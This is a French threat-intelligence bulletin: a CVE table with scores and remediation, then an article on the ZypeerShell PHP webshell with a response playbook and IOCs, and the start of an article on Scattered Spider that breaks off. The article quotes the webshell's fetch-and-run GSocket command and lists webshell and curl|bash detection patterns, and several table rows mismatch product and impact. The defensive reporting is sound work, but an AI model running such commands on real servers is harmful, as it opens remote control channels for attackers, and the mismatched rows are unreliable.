| **CVE-2026-12458** | 3.1 | 0.18% | FALSE | Chrome | Incorrect security UI | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12458](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12458) |
| **CVE-2026-12459** | 6.1 | 0.18% | FALSE | Chrome | Inappropriate implementation | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12459](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12459) |
| **CVE-2026-12460** | 4.2 | 0.15% | FALSE | Chrome | Insufficient policy enforcement | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12460](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12460) |
| **CVE-2026-12461** | 6.5 | 0.24% | FALSE | Chrome | CWE-125 Out of bounds read | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12461](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12461) |
| **CVE-2026-12462** | 7.5 | 0.26% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12462](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12462) |
| **CVE-2026-12463** | 4.7 | 0.16% | FALSE | Chrome | Inappropriate implementation | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12463](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12463) |
| **CVE-2026-12464** | 8.3 | 0.22% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12464](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12464) |
| **CVE-2026-12465** | 8.3 | 0.24% | FALSE | Chrome | CWE-20 Insufficient validation of untrusted input | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12465](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12465) |
| **CVE-2026-12466** | 8.8 | 0.41% | FALSE | Chrome | CWE-122 Heap buffer overflow | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12466](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12466) |
| **CVE-2026-12467** | 8.3 | 0.22% | FALSE | Chrome | CWE-416 Use after free | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12467](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12467) |
| **CVE-2026-12468** | 8.3 | 0.18% | FALSE | Chrome | Inappropriate implementation | Risque d'exécution de code arbitraire ou d'autres effets mémoire via une page web malveillante consultée avec Microsoft Edge. | Theoretical | Mettre à jour Microsoft Edge vers la version 149.0.4022.80 (ou ultérieure) ; isoler les postes non patchés ; activer SmartScreen et l'isolation réseau ; surveiller via EDR l'activité des processus msedge.exe. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0791/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12468](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-12468) |
| **CVE-2026-50519** | 6.5 | N/A | FALSE | GitHub Copilot Chat | CWE-1188: Initialization of a Resource with an Insecure Default | Risque d'atteinte à la confidentialité des données traitées par les services s'appuyant sur openssl ou perl-DBI dans les environnements Azure Linux 3, ainsi qu'un problème de sécurité additionnel non caractérisé publiquement. | Theoretical | Mettre à jour azl3 openssl vers 3.3.7-3 et perl-DBI vers 1.643-5 via les bulletins Microsoft ; isoler les charges non patchées ; régénérer les secrets potentiellement exposés ; surveiller l'activité réseau et applicative sur les hôtes affectés. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0792/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0792/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-50519](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-50519) |
| **CVE-2026-34183** | 7.5 | 0.53% | FALSE | OpenSSL | CWE-1325 Improperly Controlled Sequential Memory Allocation | Risque d'atteinte à la confidentialité du code source, des secrets d'API et autres données traitées par GitHub Copilot Chat, ainsi qu'un impact additionnel non caractérisé publiquement. | Theoretical | Mettre à jour GitHub Copilot Chat vers la version 1.123.2 (ou ultérieure) ; isoler les postes non patchés ; restreindre l'usage de Copilot aux projets non sensibles ; régénérer les jetons potentiellement exposés ; surveiller l'activité de l'extension. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0792/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0792/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-34183](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-34183) |
| **CVE-2026-42768** | 3.7 | 0.35% | FALSE | OpenSSL | CWE-514 Covert Channel | Risque d'atteinte à la confidentialité des données et impact additionnel non caractérisé publiquement pour les produits Microsoft concernés. | Theoretical | Appliquer le correctif Microsoft référencé dans le bulletin du 13 juin 2026 (msrc.microsoft.com/update-guide/vulnerability/CVE-2026-42768) ; isoler les produits non patchés ; régénérer les secrets potentiellement exposés ; surveiller l'activité. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0792/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0792/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-42768](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-42768) |
| **CVE-2026-45446** | 4.8 | 0.21% | FALSE | OpenSSL | CWE-325 Missing Cryptographic Step | Risque d'atteinte à la confidentialité des données et impact additionnel non caractérisé publiquement pour les produits Microsoft concernés. | Theoretical | Appliquer le correctif Microsoft référencé dans le bulletin du 13 juin 2026 (msrc.microsoft.com/update-guide/vulnerability/CVE-2026-45446) ; isoler les produits non patchés ; régénérer les secrets potentiellement exposés ; surveiller l'activité. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0792/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0792/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-45446](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-45446) |
| **CVE-2026-9698** | 7.5 | 0.71% | FALSE | DBI | CWE-787 Out-of-bounds Write | Risque d'atteinte à la confidentialité des données et impact additionnel non caractérisé publiquement pour les produits Microsoft concernés. | Theoretical | Appliquer le correctif Microsoft référencé dans le bulletin du 17 juin 2026 (msrc.microsoft.com/update-guide/vulnerability/CVE-2026-9698) ; isoler les produits non patchés ; régénérer les secrets potentiellement exposés ; surveiller l'activité. | [https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0792/](https://www.cert.ssi.gouv.fr/avis/CERTFR-2026-AVI-0792/)<br>[https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-9698](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-9698) |
| **CVE-2026-30040** | N/A | N/A | FALSE | FastStone Image Viewer 8.3.0.0 et antérieures - parseur JPEG 2000 (JP2) | Heap-based buffer overflow (CWE-122) menant à une exécution de code arbitraire | Exécution de code arbitraire dans le contexte de l'utilisateur exécutant FastStone Image Viewer lors de la simple énumération de dossiers contenant un fichier JP2 malveillant. Risque de compromission persistante, exfiltration de données et pivot, amplifié si le service tourne avec des privilèges élevés. | Theoretical | Restreindre l'utilisation de FastStone Image Viewer à un compte local limité ; empêcher le téléchargement/l'enregistrement de fichiers JP2 depuis des sources non fiables ; désactiver la génération automatique de miniatures si possible ; envisager une alternative (visionneuse d'images) jusqu'à disponibilité d'un correctif ; surveiller les processus FSViewer.exe via EDR. | [https://kb.cert.org/vuls/id/936962](https://kb.cert.org/vuls/id/936962) |
| **CVE-2026-30041** | N/A | N/A | FALSE | FastStone Image Viewer 8.3.0.0 et antérieures - parseur PSD | Integer overflow (CWE-190) menant à un heap-based buffer overflow, RCE ou DoS persistant | Exécution de code arbitraire dans le contexte de l'utilisateur exécutant FastStone Image Viewer lors de l'ouverture d'un fichier PSD malveillant, ou déni de service persistant (crash) de l'application. Risque amplifié si le processus tourne avec des privilèges élevés. | Theoretical | Restreindre l'utilisation de FastStone Image Viewer à un compte local limité ; empêcher le téléchargement/l'enregistrement de fichiers PSD depuis des sources non fiables ; envisager une alternative (visionneuse d'images) jusqu'à disponibilité d'un correctif ; surveiller les processus FSViewer.exe via EDR. | [https://kb.cert.org/vuls/id/936962](https://kb.cert.org/vuls/id/936962) |
| **CVE-2026-11833** | 8.2 | N/A | FALSE | FAST/TOOLS, CI Server | CWE-319 Cleartext transmission of sensitive information | Exposition d'informations de configuration sensibles pouvant faciliter des attaques ciblées contre les systèmes de contrôle industriel Yokogawa. Risque d'escalade vers une compromission plus large du réseau industriel. | Theoretical | Mettre à jour FAST/TOOLS vers une version corrigée et CI Server vers une version corrigée. Appliquer les correctifs Yokogawa conformément à l'avis du fabricant. Restreindre l'accès réseau aux serveurs Yokogawa. | [https://cvefeed.io/vuln/detail/CVE-2026-11833](https://cvefeed.io/vuln/detail/CVE-2026-11833) |
| **CVE-2026-54232** | 8.8 | N/A | FALSE | vllm | CWE-427: Uncontrolled Search Path Element | Exécution de code arbitraire en root dans les conteneurs vLLM, permettant l'exfiltration de tous les prompts utilisateurs, identifiants API et données de modèles depuis les déploiements de production. Compromission complète de la chaîne d'approvisionnement logicielle. | Theoretical | Mettre à jour vLLM vers la version 0.22.1 ou ultérieure. Supprimer les --extra-index-url pointant vers des index non maîtrisés. S'assurer que tous les noms de paquets utilisés sont enregistrés sur PyPI. Désactiver la stratégie d'index unsafe-best-match. | [https://cvefeed.io/vuln/detail/CVE-2026-54232](https://cvefeed.io/vuln/detail/CVE-2026-54232)<br>[https://flashinfer.ai/whl/](https://flashinfer.ai/whl/) |
| **CVE-2026-48746** | 9.1 | N/A | FALSE | vllm | CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') | Accès non autorisé à l'API OpenAI compatible de vLLM, exposant potentiellement des modèles LLM, des données d'inférence sensibles et permettant l'exécution de requêtes coûteuses en ressources de calcul. | Theoretical | Mettre à jour vLLM vers la version 0.22.0 ou ultérieure. Vérifier que l'authentification par clé API est correctement appliquée. Auditer l'historique des accès pour identifier des compromissions antérieures. | [https://cvefeed.io/vuln/detail/CVE-2026-48746](https://cvefeed.io/vuln/detail/CVE-2026-48746) |
| **CVE-2026-48109** | 8.2 | N/A | FALSE | MessagePack-CSharp | CWE-20: Improper Input Validation | Déni de service par terminaison du processus, et sous certaines conditions, divulgation limitée de données mémoire non intentionnelles. | Theoretical | Mettre à jour MessagePack for C# vers la version 2.5.301 ou 3.1.7 (ou ultérieure) selon la branche utilisée. | [https://cvefeed.io/vuln/detail/CVE-2026-48109](https://cvefeed.io/vuln/detail/CVE-2026-48109) |
| **CVE-2026-48502** | 8.2 | N/A | FALSE | MessagePack for C# versions antérieures à 2.5.301 et 3.1.7 | Déni de service par débordement de pile (Stack Overflow) | Terminaison du processus hôte par StackOverflowException non récupérable, entraînant un déni de service complet. | Theoretical | Mettre à jour MessagePack for C# vers la version 2.5.301 ou 3.1.7 (ou ultérieure) selon la branche utilisée. Appliquer les correctifs de sécurité pour la bibliothèque MessagePack C#. | [https://cvefeed.io/vuln/detail/CVE-2026-48502](https://cvefeed.io/vuln/detail/CVE-2026-48502) |
| **CVE-2026-56348** | 9.1 | N/A | FALSE | n8n versions antérieures à 2.20.0 | Server-Side Request Forgery (SSRF) / Exfiltration d'identifiants | Exfiltration de credentials sensibles et contournement des contrôles de sortie réseau, exposant potentiellement les identifiants stockés dans n8n et les services internes intégrés. | Theoretical | Mettre à jour n8n vers la version 2.20.0 ou ultérieure. Restreindre l'accès à l'endpoint /rest/dynamic-node-parameters/options. Surveiller le trafic réseau pour détecter les requêtes non autorisées. | [https://cvefeed.io/vuln/detail/CVE-2026-56348](https://cvefeed.io/vuln/detail/CVE-2026-56348)<br>[https://www.vulncheck.com/](https://www.vulncheck.com/) |
| **CVE-2026-49777** | 10.0 | 1.24% | FALSE | Product Slider Pro for WooCommerce | CWE-1284 Improper Validation of Specified Quantity in Input | Compromission complète des sites WordPress/WooCommerce: vol d'identifiants, codes 2FA, credentials base de données, clés d'authentification, identifiants SMTP et données de commandes. Persistance via REST custom et web shell. Exfiltration massive de données sensibles. CVSS 10.0 (sévérité maximale). | Active | Mettre à jour immédiatement les plugins ShapedPlugin Pro vers les versions corrigées dès leur disponibilité. Réinitialiser tous les mots de passe, secrets 2FA et identifiants base de données. Révoquer et régénérer les credentials SMTP. Auditer les comptes administrateurs et la configuration WooCommerce. Bloquer le C2 194.76.217[.]28. Surveiller les sites pour présence de faux plugins, web shell et endpoint REST non autorisés. | [https://thehackernews.com/2026/06/shapedplugin-wordpress-pro-plugins.html](https://thehackernews.com/2026/06/shapedplugin-wordpress-pro-plugins.html)<br>[https://www.wordfence.com/](https://www.wordfence.com/) |
| **CVE-2026-10735** | 9.8 | N/A | FALSE | Ensemble des plugins ShapedPlugin Pro distribués via account.shapedplugin.com (incident global de chaîne d'approvisionnement) | Identifiant d'incident - compromission chaîne d'approvisionnement (Supply Chain) | Incident de chaîne d'approvisionnement affectant tous les acquéreurs de licences Pro ShapedPlugin. Compromission des sites WordPress avec vol d'identifiants, persistance et exfiltration de données sensibles. | Active | Suivre l'avis ShapedPlugin et appliquer les versions corrigées. Réinitialiser les identifiants et secrets. Auditer l'intégrité des sites et des plugins installés. Bloquer les communications vers le C2 identifié. | [https://thehackernews.com/2026/06/shapedplugin-wordpress-pro-plugins.html](https://thehackernews.com/2026/06/shapedplugin-wordpress-pro-plugins.html) |
| **CVE-2026-42824** | 6.5 | 0.50% | FALSE | Microsoft 365 Copilot | CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection') | Exfiltration potentielle d'emails, de codes d'authentification à usage unique et de documents stockés dans OneDrive et SharePoint. Confidentialité des communications et des secrets d'entreprise compromise pour tout utilisateur Copilot ciblé. | Theoretical | Appliquer le correctif Microsoft publié pour CVE-2026-42824, renforcer la formation des utilisateurs aux risques de prompt injection, surveiller les flux de données sortants depuis l'environnement Microsoft 365 et auditer les permissions d'accès aux fichiers sensibles. | [https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/](https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/) |
| **CVE-2026-39813** | 9.1 | 18.70% | FALSE | FortiSandbox, FortiSandbox Cloud | CWE-24 Escalation of privilege | Risque de prise de contrôle du sandbox de sécurité, exposition des analyses de malware en cours, contournement potentiel des politiques de sécurité et pivot vers les infrastructures internes connectées à FortiSandbox. | Active | Appliquer sans délai les correctifs Fortinet, restreindre l'accès réseau aux API FortiSandbox, activer la protection IPS Check Point dédiée à CVE-2026-39813 et auditer l'intégrité du système de fichiers après exposition. | [https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/](https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/) |
| **CVE-2026-39808** | 9.1 | 66.17% | FALSE | FortiSandbox, FortiSandbox PaaS | CWE-78 Execute unauthorized code or commands | Exécution de code arbitraire en root sur FortiSandbox, compromission des analyses de malware, contournement des politiques de sécurité, pivot vers les infrastructures internes et risque de persistance dans l'environnement. | Active | Appliquer immédiatement le correctif Fortinet, restreindre drastiquement l'accès aux API FortiSandbox, activer la protection IPS Check Point dédiée, et envisager la reconstruction des appliances compromises. | [https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/](https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/) |
| **CVE-2026-25089** | 9.1 | 2.66% | FALSE | FortiSandbox, FortiSandbox Cloud, FortiSandbox PaaS | CWE-78 Execute unauthorized code or commands | Prise de contrôle potentielle de FortiSandbox, compromission des analyses de malware, contournement des politiques de sécurité et exposition des workflows internes de sécurité. | Active | Appliquer les correctifs Fortinet couvrant l'ensemble des CVE FortiSandbox référencées, restreindre l'accès aux API, surveiller les journaux et activer les protections IPS appropriées. | [https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/](https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/) |
| **CVE-2026-50656** | 7.8 | 0.34% | FALSE | Microsoft Malware Protection Engine | CWE-59: Improper Link Resolution Before File Access ('Link Following') | Escalade de privilèges vers SYSTEM sur les endpoints Windows, permettant le contournement de l'antivirus Defender, la désactivation de solutions de sécurité, l'installation de malwares persistants et le pivot vers d'autres systèmes du domaine. | Active | Surveiller la publication du correctif Microsoft et l'appliquer en priorité, renforcer le contrôle d'application (WDAC, AppLocker), auditer les endpoints à la recherche de signes d'escalade SYSTEM, et activer la télémétrie Defender avancée pour la détection de race conditions. | [https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/](https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/) |
| **CVE-2026-20262** | 6.5 | 1.15% | TRUE | Cisco Catalyst SD-WAN Manager | CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | Compromission du SD-WAN Manager, écrasement de fichiers système critiques, escalade de privilèges root, détournement potentiel du plan d'orchestration SD-WAN et exposition des sites distants du réseau d'entreprise. | Active | Appliquer immédiatement les correctifs Cisco, restreindre l'accès au SD-WAN Manager à des administrateurs de confiance, surveiller l'intégrité des fichiers système et auditer les comptes privilégiés. | [https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/](https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/) |
| **CVE-2026-20253** | 9.8 | 10.04% | TRUE | Splunk Enterprise | CWE-306 The software does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources. | Exécution potentielle de code arbitraire à distance sur les instances Splunk Enterprise, compromission de données d'observabilité sensibles, pivot vers les systèmes émettant des logs vers Splunk et exposition des secrets contenus dans les configurations Splunk. | Active | Appliquer immédiatement les correctifs Splunk, limiter l'accès réseau aux interfaces Splunk, surveiller les opérations sur fichiers et auditer les comptes d'administration Splunk pour détecter toute compromission. | [https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/](https://research.checkpoint.com/2026/22nd-june-threat-intelligence-report/) |
| **VU#226679** | N/A | N/A | FALSE | Microsoft Windows 10 et 11 (Windows Recovery Environment - WinRE) | Bypass de protections pré-boot UEFI/BIOS (et potentiellement BitLocker) | Contournement des protections firmware UEFI/BIOS configurées par l'administrateur, et potentiellement affaiblissement ou contournement du chiffrement intégral BitLocker, pouvant mener à un accès non autorisé aux données sensibles du système. | Theoretical | Ne pas se reposer uniquement sur les mots de passe UEFI/BIOS pour les systèmes où WinRE est accessible à des utilisateurs non fiables. Implémenter des contrôles additionnels (accès physique restreint, BitLocker avec PIN, durcissement WinRE). Appliquer l'avis Microsoft relatif au durcissement de l'environnement de récupération et des configurations Secure Boot. Examiner les configurations firmware des postes et mettre à jour les firmwares selon les recommandations du fabricant. | [https://kb.cert.org/vuls/id/226679](https://kb.cert.org/vuls/id/226679) |

---

<div id="articles"></div>

# SECTION "ARTICLES"

---

<div id="zypeershell-un-nouveau-webshell-php-open-source-integrant-un-deploiement-gsocket"></div>

## ZypeerShell : un nouveau webshell PHP open-source intégrant un déploiement GSocket

### Résumé

L'ISC SANS a identifié un webshell PHP nommé ZypeerShell, publié sur GitHub il y a environ deux mois par 'sagsooz'. Présenté comme 'le webshell PHP le plus puissant, indétectable et riche en fonctionnalités disponible sur GitHub', il propose les fonctionnalités classiques d'administration à distance. Une fonction non appelée depuis l'interface (zypeergsdeploy()) permet de déployer un agent GSocket via la commande 'bash -c "$(curl -fsSL hxxps://gsocket.io/y)"' afin d'établir un canal C2 (gs-netcat). Le dépôt inclut également une version obfusquée avec 'Fortress Layer', un loader multi-couches avec contrôles d'intégrité. L'outil est par ailleurs référencé comme 'red-team tool' sur un canal Telegram.

---

### Analyse opérationnelle

Les équipes SOC doivent rechercher sur leurs serveurs web exposés (PHP, Nginx/Apache) les artefacts ZypeerShell (fonctions zypeergsdeploy(), chaîne GSocket, paramètres POST 'zypeer3'), bloquer les flux sortants vers gsocket[.]io et alerter sur tout processus bash ou gs-netcat issu du worker PHP. La surface d'attaque concerne principalement les serveurs PHP permettant l'écriture de fichiers (uploads, CMS, panneaux d'administration compromis). Les mesures prioritaires incluent: durcissement PHP (open_basedir, désactivation des fonctions système), WAF avec signatures webshells, allow-listing des extensions, chasse YARA, audit des processus enfants PHP-FPM, et surveillance des téléchargements curl|bash.

---

### Implications stratégiques

La disponibilité libre de webshells avancés (avec canal C2 chiffré via GSocket) abaisse encore la barrière à l'entrée pour des attaquants peu qualifiés et augmente le risque d'intrusion persistante. L'obfuscation 'Fortress Layer' complique la détection par les antivirus et EDR standards. Pour les organisations, cela impose un investissement continu dans la sécurité applicative (SDLC, audits de code), la supervision des flux sortants et la formation des administrateurs web. La diffusion via Telegram et GitHub confirme la tendance à la commercialisation d'outils offensifs 'clé en main' et la nécessité d'intégrer la threat intelligence open-source dans la veille.

---

### Recommandations

* Bloquer au proxy/IDS les domaines gsocket[.]io et signatures associées
* Auditer tous les serveurs PHP pour la présence de webshells (YARA + comparaison de hash)
* Durcir la configuration PHP (disable_functions, open_basedir) et appliquer le principe de moindre privilège sur les workers
* Mettre en place une détection des schémas curl|bash issus des processus PHP
* Participer au partage d'IOC via MISP/STIX avec les communautés sectorielles
* Réaliser un test d'intrusion ciblant la surface d'upload et les RCE applicatives

---

### Playbook de réponse à incident

#### Phase 1 — Préparation

* Maintenir une cartographie exhaustive des applications PHP exposées (CMS, frameworks, panneaux d'admin).
* Durcir les serveurs web: désactivation des fonctions PHP dangereuses (exec, system, passthru, shell_exec, popen, proc_open), open_basedir restrictif, PHP-FPM en chroot.
* Déployer une allow-list d'extensions de fichiers (interdire .php dans les répertoires d'upload) et un WAF avec signatures webshells.
* Surveiller la présence de dépôts GitHub d'outils offensifs open-source pour anticiper les IOC.
* Préparer des règles YARA/LOLBAS ciblant GSocket (gs-netcat) et les chaînes curl|bash.

#### Phase 2 — Détection et analyse

* Détecter les requêtes sortantes vers gsocket[.]io et hxxps://gsocket.io/y depuis les serveurs web.
* Mettre en corrélation les écritures de fichiers PHP dans des répertoires non applicatifs (uploads, /tmp, dossiers de cache).
* Rechercher les artefacts ZypeerShell: fonctions zypeergsdeploy(), interfaces GSocket Deploy Tool, mentions 'zypeer'.
* Alerter sur les processus enfants inattendus (gs-netcat, bash issu de PHP-FPM/Nginx/Apache).
* Inspecter les logs d'accès (User-Agent, paramètres POST contenant 'zypeer3') et les téléchargements massifs de fichiers .php.
* Comparer les hashes SHA256 des fichiers PHP sur disque avec un baseline connu.

#### Phase 3 — Confinement, éradication et récupération

* Isoler le serveur web compromis du réseau (quarantaine VLAN) sans couper immédiatement pour préserver la preuve.
* Bloquer au niveau proxy/IDS les flux vers gsocket[.]io et signatures connues GSocket.
* Sauvegarder l'image mémoire et le système de fichiers avant toute remédiation.
* Désactiver les comptes administrateur web potentiellement compromis et révoquer les clés SSH/jetons associés.
* Reconstruire le serveur depuis une image maîtresse saine; ne jamais 'nettoyer' un webshell en place.

#### Phase 4 — Activités post-incident

* Évaluer l'étendue de la compromission: pivots latéraux, persistance (cron, systemd, clés SSH ajoutées, binaires GSocket).
* Notifier les parties prenantes (RSSI, DPO si données concernées, CSIRT externe).
* Documenter les IOC et partager via MISP/STIX/TAXII avec le secteur.
* Réaliser un RCA (root cause analysis) sur la vulnérabilité initiale d'intrusion (RCE, upload non authentifié, vol de credentials).
* Renforcer la politique de mot de passe et MFA pour les accès admin web, et mettre en place une rotation des secrets.

#### Phase 5 — Threat Hunting (proactif)

* Chasser proactivement les indicateurs GSocket (gs-netcat, /tmp/.gsocket, variables GS_TOKEN) sur l'ensemble des endpoints et serveurs.
* Rechercher des webshells dormants basés sur des patterns PHP classiques (eval, base64_decode, gzinflate, assert,preg_replace avec /e).
* Auditer les dépôts Git internes pour la présence involontaire de webshells tiers (risque supply-chain).
* Corréler les sorties DNS/TLS anormales avec les serveurs web exposés.
* Tester la résilience via red team (simulations d'upload de webshell et de déploiement GSocket).

---

### Indicateurs de compromission

| Type | Valeur (DEFANG) | Fiabilité |
|---|---|---|
| URL | `hxxps://github.com/sagsooz/ZypeerShell` | High |
| DOMAIN | `gsocket[.]io` | High |
| URL | `hxxps://gsocket.io/y` | High |

---

### TTP MITRE ATT&CK

| ID TTP | Description |
|---|---|
| **T1505.003** | Web Shell: persistance via webshell PHP déposé sur serveur compromis |
| **T1059.006** | Command and Scripting Interpreter: Python (bash -c $(curl...)) pour déploiement GSocket |
| **T1071.001** | Application Layer Protocol: Web Protocols pour canal C2 |
| **T1105** | Ingress Tool Transfer via curl/fetch |

---

### Sources

* [https://isc.sans.edu/diary/rss/33096](https://isc.sans.edu/diary/rss/33096)


---

<div id="scattered-spider-deux-membres-presumes-plaident-coupables-pour-la-cyberattaque-contre-tfl-39-m"></div>

## Scattered Spider : deux membres présumés plaident coupables pour la cyberattaque contre TfL (39 M£)

### Résumé

Deux hommes, présentés comme appartenant au groupe Scattered Spider, ont plaidé coupables dans le cadre de la cyberattaque contre Transport for London (TfL) ayant causé environ 39 millions de livres sterling de dommages.

---

### Analyse opérationnelle

